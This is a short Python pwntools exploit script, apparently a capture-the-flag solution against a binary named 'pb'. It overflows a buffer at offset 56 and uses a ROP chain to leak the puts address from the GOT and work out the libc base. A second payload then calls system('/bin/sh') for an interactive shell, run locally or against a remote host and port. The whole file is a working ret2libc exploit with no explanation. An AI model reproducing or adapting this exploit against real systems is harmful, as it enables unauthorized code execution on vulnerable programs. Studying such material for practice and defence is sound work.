from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


exe = './pb'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = start()

offset = 56
libc = elf.libc
ret = ROP(elf).find_gadget(['ret'])[0]
pop_rdi = ROP(elf).find_gadget(['pop rdi'])[0]
payload = flat({offset : [
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    elf.sym['box']
]})

io.sendlineafter(b'>>', b'2')
io.sendlineafter(b': ', payload)

puts_leaks = unpack(io.recvlines(4)[3].ljust(8, b'\x00'))

info(f"Puts GOT Leaks : {hex(puts_leaks)}")
libc.address = puts_leaks - libc.sym['puts']
info(f"LIBC Base : {hex(libc.address)}")

payload = flat({offset : [
    ret,
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system']
]})
io.sendlineafter(b'>>', b'2')
io.sendlineafter(b': ', payload)
io.clean()
io.interactive()

